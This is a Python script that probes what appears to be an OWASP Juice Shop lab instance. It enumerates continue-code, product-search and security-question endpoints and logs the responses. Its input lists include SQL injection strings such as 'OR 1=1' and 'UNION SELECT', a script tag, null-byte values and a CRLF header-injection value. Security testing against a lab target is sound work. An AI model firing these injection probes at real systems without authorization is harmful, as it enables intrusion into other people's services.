import urllib.request, urllib.error, json, time, sys, urllib.parse
B="http://lab-mutator:3000"
def req(path, method="GET", data=None, ctype=None, timeout=10):
    h={"User-Agent":"Mozilla/5.0 (research)"}
    if ctype: h["Content-Type"]=ctype
    d=None
    if data is not None:
        d = data if isinstance(data, bytes) else json.dumps(data).encode()
    r=urllib.request.Request(B+path, data=d, headers=h, method=method)
    try:
        with urllib.request.urlopen(r,timeout=timeout) as rr:
            return rr.status, rr.read(), rr.headers.get("content-type","")
    except urllib.error.HTTPError as e:
        return e.code, e.read(), e.headers.get("content-type","")
    except Exception as e:
        return "ERR", b"", f"{type(e).__name__}"

results=[]
def R(label, st, sz, ct, extra=""):
    r=label + ": " + str(st) + " " + str(sz) + "B ct=" + ct + extra
    results.append(r)
    if str(st) not in ("500","ERR") and int(str(st))<400:
        print(r)

# --- Continue-code flow ---
st,b,ct=req("/rest/continue-code","GET")
R("GET /rest/continue-code", st, len(b), ct, " b=" + str(b[:60]))
code=json.loads(b).get("continueCode","") if st==200 else ""
for path in ["/rest/continue-code/apply/"+code, "/rest/continue-code/apply/"+code+"/extra",
             "/api/ContinueCode/apply", "/api/ContinueCode/apply/"+code,
             "/rest/continue-code/apply", "/api/ContinueCode/apply/"]:
    st,b,ct=req(path,"GET")
    R("GET "+path, st, len(b), ct, " b=" + str(b[:40]))
    if code:
        st,b,ct=req(path,"POST",{"code":code})
        R("POST "+path+" with code", st, len(b), ct, " b=" + str(b[:40]))
for code in ["","a"*100,"{}","null","<script>","a/b/c","123","0"]:
    st,b,ct=req("/rest/continue-code/apply/"+urllib.parse.quote(code),"GET")
    R("GET /rest/continue-code/apply/"+code[:12], st, len(b), ct, " b=" + str(b[:40]))

# --- Search differentials ---
params=[("q=Apple","GET"),("q=Apple","POST"),("q=OR%201=1","GET"),("q=UNION%20SELECT%201,2","GET"),
        ("q=","GET"),("query=Apple","GET"),("search=Apple","GET"),("term=Apple","GET"),
        ("filter=Apple","GET"),("q=%22Apple%22","GET"),("q=%25Apple%25","GET"),
        ("q=Apple&orderBy=name","GET"),("q=Apple&limit=1","GET"),("q=Apple&skip=10","GET"),
        ("q=Apple&where=%7B%22name%22%7D","GET"),("q=Apple&orderBy=id&direction=ASC","GET"),
        ("q=%E2%80%98","GET"),("q=A%27","GET"),("q=A%22","GET"),
        ("q=Apple&limit=x","GET"),("q=Apple&limit=1&offset=0","GET"),
        ("q=Apple&sort=name","GET"),("q=Apple&direction=asc","GET")]
for p,m in params:
    q=urllib.parse.parse_qs(urllib.parse.urlsplit(p).query)
    st,b,ct=req("/rest/products/search",m,q,"application/json" if m=="POST" else None)
    R("GET /rest/products/search?"+p, st, len(b), ct, " b="+str(b[:40]))

# --- Security-question enumeration differentials ---
emails=["bjoern@owasp.org","","x","a@b","bjoern@owasp.org%27","bjoern@owasp.org%26%2339;",
        "bjoern@owasp.org'--","bjoern@owasp.org'OR'1'='1","12345","admin@example.com",
        "nonexistent@x.y","bjoern%40owasp.org","Bjoern@owasp.org","bjoern@owasp.org+foo",
        "  bjoern@owasp.org  ","bjoern@owasp.org%00@x.y","bjoern@owasp.org%0d%0aSet-Cookie:a=b"]
for email in emails:
    ep=urllib.parse.quote(email,safe="")
    st,b,ct=req("/rest/user/security-question?email="+ep,"GET")
    R("GET ?email="+email[:30], st, len(b), ct, " b="+str(b[:40]))
for pname in ["email=bjoern@owasp.org","questionId=7","id=7","user=bjoern@owasp.org"]:
    st,b,ct=req("/rest/user/security-question?"+pname,"GET")
    R("GET ?"+pname, st, len(b), ct, " b="+str(b[:40]))

json.dump(results, open("/workspace/reports/hypo1.json","w"))
print("\n=== wrote", len(results), "hypothesis results ===")
